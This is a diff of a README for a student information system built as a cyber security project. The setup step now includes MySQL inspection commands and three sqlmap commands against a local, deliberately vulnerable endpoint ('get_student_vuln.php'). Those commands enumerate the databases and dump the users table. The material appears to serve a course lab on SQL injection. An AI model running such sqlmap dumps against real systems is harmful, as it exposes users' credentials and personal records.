@@ -39,7 +39,17 @@ A full-stack web application for managing student records, built as a Cyber Secu
 
 2. **Create the database**:
    ```bash
-   mysql -u root -p < student-information-system/database/sis.sql
+   sudo mysql -u root < database/sis.sql
+   sudo mysql
+   SHOW DATABASES;
+   USE sis_db;
+   SHOW TABLES;
+   SELECT * FROM users;
+   php -S localhost:8000 -t ../
+   sqlmap -u "http://localhost:8000/student-information-system/backend/api/students/get_student_vuln.php?id=1" --dbs --batch --flush-session
+   sqlmap -u "http://localhost:8000/student-information-system/backend/api/students/get_student_vuln.php?id=1" -D sis_db -T users --columns --batch --flush-session
+   sqlmap -u "http://localhost:8000/student-information-system/backend/api/students/get_student_vuln.php?id=1" -D sis_db -T users --dump --batch --flush-session
+
    ```
 
 3. **Configure database credentials** in `backend/config/database.php`:
